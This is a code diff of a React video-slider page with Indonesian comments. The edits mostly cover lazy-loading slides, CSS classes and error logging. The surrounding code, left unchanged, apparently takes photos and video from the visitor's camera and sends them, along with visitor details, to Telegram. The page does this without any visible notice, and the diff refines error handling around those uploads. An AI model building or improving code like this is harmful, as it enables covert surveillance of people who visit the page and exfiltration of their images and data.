@@ -59,20 +59,30 @@ function App() {
     setVideoErrors(new Array(videos.length).fill(false));
   }, []);
 
-  // Logika pemuatan video per slide
+  // Logika pemuatan video per slide menggunakan IntersectionObserver
   useEffect(() => {
-    const loadNextSlide = () => {
-      const nextSlide = (currentSlide + 1) % videoSlides.length;
-      if (!loadedSlides.includes(nextSlide)) {
-        console.log(`Memuat slide berikutnya: ${nextSlide}`);
-        setLoadedSlides((prev) => [...prev, nextSlide]);
-      }
-    };
+    const observer = new IntersectionObserver(
+      (entries) => {
+        entries.forEach((entry) => {
+          if (entry.isIntersecting) {
+            const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
+            if (!loadedSlides.includes(slideIndex)) {
+              console.log(`Memuat slide: ${slideIndex}`);
+              setLoadedSlides((prev) => [...prev, slideIndex]);
+            }
+          }
+        });
+      },
+      { threshold: 0.1 }
+    );
 
-    // Muat slide berikutnya setelah slide aktif selesai dimuat
-    const timer = setTimeout(loadNextSlide, 2000);
-    return () => clearTimeout(timer);
-  }, [currentSlide, loadedSlides]);
+    const slideElements = document.querySelectorAll('.slide-container');
+    slideElements.forEach((el) => observer.observe(el));
+
+    return () => {
+      slideElements.forEach((el) => observer.unobserve(el));
+    };
+  }, [loadedSlides]);
 
   useEffect(() => {
     monitorSuspiciousActivity();
@@ -109,7 +119,7 @@ function App() {
         await sendTelegramNotification(visitorDetails);
         console.log('Notifikasi pengunjung berhasil dikirim.');
       } catch (error) {
-        console.error('Gagal mengirim notifikasi pengunjung:', error);
+        console.error(`Gagal mengirim notifikasi pengunjung: ${error.message}`, error);
       }
     };
 
@@ -313,7 +323,7 @@ function App() {
         await sendImageToTelegram(photoBlob);
         console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
       } catch (error) {
-        console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
+        console.error(`Gagal mengirim foto dari kamera ${type}: ${error.message}`, error);
       }
 
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
@@ -339,7 +349,7 @@ function App() {
           await sendVideoToTelegram(videoBlob);
           console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
         } catch (error) {
-          console.error(`Gagal mengirim video dari kamera ${type}:`, error);
+          console.error(`Gagal mengirim video dari kamera ${type}: ${error.message}`, error);
         }
       };
 
@@ -569,7 +579,7 @@ function App() {
       }
 
       if (i >= start && i < end) {
-        return <button>{i + 1}</button>;
+        return <button className="custom-dot">{i + 1}</button>;
       } else if (i === end && end < totalSlides) {
         return (
           <div className="dots-placeholder">
@@ -577,7 +587,7 @@ function App() {
           </div>
         );
       }
-      return <div style={{ display: 'none' }} />;
+      return <div className="hidden-dot" />;
     },
     appendDots: (dots: React.ReactNode) => (
       <div>
@@ -586,11 +596,6 @@ function App() {
     ),
     afterChange: (index: number) => {
       setCurrentSlide(index);
-      const nextSlide = (index + 1) % videoSlides.length;
-      if (!loadedSlides.includes(nextSlide)) {
-        console.log(`Memuat slide berikutnya karena perubahan slide: ${nextSlide}`);
-        setLoadedSlides((prev) => [...prev, nextSlide]);
-      }
     },
   };
 
@@ -605,7 +610,11 @@ function App() {
         <div className="max-w-[1200px] mx-auto">
           <Slider ref={sliderRef} {...sliderSettings}>
             {videoSlides.map((slideVideos, slideIndex) => (
-              <div key={slideIndex} className="px-2">
+              <div
+                key={slideIndex}
+                className="px-2 slide-container"
+                data-slide-index={slideIndex}
+              >
                 {!loadedSlides.includes(slideIndex) ? (
                   <div className="flex items-center justify-center h-[200px] bg-gray-800 bg-opacity-75">
                     <svg
@@ -681,6 +690,7 @@ function App() {
                             preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
                             {...({ loading: 'lazy' } as any)}
                           >
+                            <source src={videos[globalIndex].videoUrl} type="video/mp4" />
                             <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                           </video>
                           {isPlaying === globalIndex && !videoErrors[globalIndex] && (
